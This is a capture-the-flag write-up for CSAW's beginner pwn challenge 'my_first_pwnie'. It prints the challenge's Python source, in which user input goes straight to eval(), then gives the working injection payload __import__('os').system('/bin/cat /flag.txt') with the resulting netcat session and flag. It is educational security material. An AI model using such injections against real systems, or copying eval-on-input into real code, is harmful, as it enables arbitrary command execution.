# my\_first\_pwnie

> You must be this 👉 high to ride.&#x20;
>
> Note: flag is in `/flag.txt`&#x20;
>
> Author: `ElykDeer`&#x20;
>
> Connect with:&#x20;
>
> `nc intro.csaw.io 31137`&#x20;
>
> [my\_first\_pwnie.py](https://ctf.csaw.io/files/aad33fd8e9d2e834d61f2c3a8aadbf81/my\_first\_pwnie.py?token=eyJ1c2VyX2lkIjoxMzYwLCJ0ZWFtX2lkIjo1NjksImZpbGVfaWQiOjIzfQ.ZQU9TA.zIuM2LRsbqIEf23AgA-zm8GrEO0)

Let's first using `netcat` in order to understand what the program does.

```
$ nc intro.csaw.io 31137
What's the password?
```

It asks user to input a password.

Maybe the `my_first_pwnie.py` script file has the password mentioned somewhere in the code.

### Source code

```python
#!/usr/bin/env python3

# Pwn mostly builds on top of rev.
# While rev is more about understanding how a program works, pwn is more about figuring out how to exploit a program to reach the holy grail: Arbitrary Code Execution
#
# If you can execute arbitrary code on a system, that system might as well be yours...because you can do whatever you want with it! (this is the namesake of "pwn".....if you pwn a system, you own the system)
# Of course, that comes with the limitations of the environment you are executing code in...are you a restricted user, or a super admin?
# Sometimes you can make yourself a super admin starting from being a restricted user.....but we're not gonna do that right now.
#
# For now, I want you to figure out how to execute arbitrary commands on the server running the following code.
#
# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`

try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")
```

So the password is `password` but entering it does not give us the flag.

There is an interesting comment:

```
# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`
```

So we have to execute a command on the server to read the `flag.txt` file.

### eval()

If we look closely at the code, we can see that it uses the `eval()` function.

This allows user to dynamically execute code during runtime. However when user input is directly passed to the `eval()` function, it can lead to code injection.

### Injection

```python
__import__('os').system('/bin/cat /flag.txt')
```

Let's provide the injection as input.

```
$ nc intro.csaw.io 31137
What's the password? __import__('os').system('/bin/cat /flag.txt')
csawctf{neigh______}
You entered `0`
Nay, that's not it.
```

### Flag

```
csawctf{neigh______}
```
